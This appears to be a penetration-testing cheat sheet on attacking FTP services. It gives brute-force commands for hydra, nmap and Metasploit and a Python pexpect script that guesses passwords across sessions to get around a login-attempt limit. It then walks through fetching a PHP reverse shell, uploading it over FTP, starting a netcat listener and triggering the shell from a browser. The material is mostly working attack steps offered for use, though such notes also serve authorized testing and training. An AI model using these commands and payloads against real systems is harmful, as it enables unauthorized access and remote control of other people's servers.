### FTP Anonymous Login
> Try `anonymous:anonymous` login
``` bash
ftp IP (with/without credentials)
```

### Brute Force
```bash
hydra -L <user_list> -P <password_list> IP ftp
```

```bash
nmap IP --script ftp-brute --script-args userdb=/root/users -p 21
```

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_login
```

> A custom script to attemp the logins is required if automated dictionary attack do not work, since the server terminates the sessions after 3 login attempts.
```bash
import pexpect
import sys
username=sys.argv[2]
password_dict=sys.argv[3]

# Loading the password dictionary and Striping \n
lines = [line.rstrip('\n') for line in open(password_dict)]

itr = 0
# Iterating over dictionary
for password in lines:
	child = pexpect.spawn ('ftp '+sys.argv[1])
	child.expect ('Name .*: ')
	child.sendline (username)
    print "Trying with password: ",password
	child.expect ('Password:')
	child.sendline (password)
	i = child.expect (['Login successful', 'Login failed'])
	if i==1:
		#print('Login failed')
		child.kill(0)
	elif i==0:
		print "Login Successful for ",password
		print child.before
		break
```

### Reverse Shell over Website

> Download the payload
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
```

> Edit some variables in shell.php
```bash
$ip = '<your-local-ip>';
$port = 1234;
```

> Connect to the FTP server and upload the payload.
```bash
ftp <target-ip>
```

>  Upload the payload you downloaded
```bash
ftp> put shell.php
```
> Get a shell
Firstly, you need to open a listener on your local machine.
```bash
nc -lvnp 1234
```

> Then, in a web browser, navigate to "http://target.com/path/to/ftp/shell.php". This should trigger the exploit and establish a connection back to your listener, providing you with a shell on the target system.

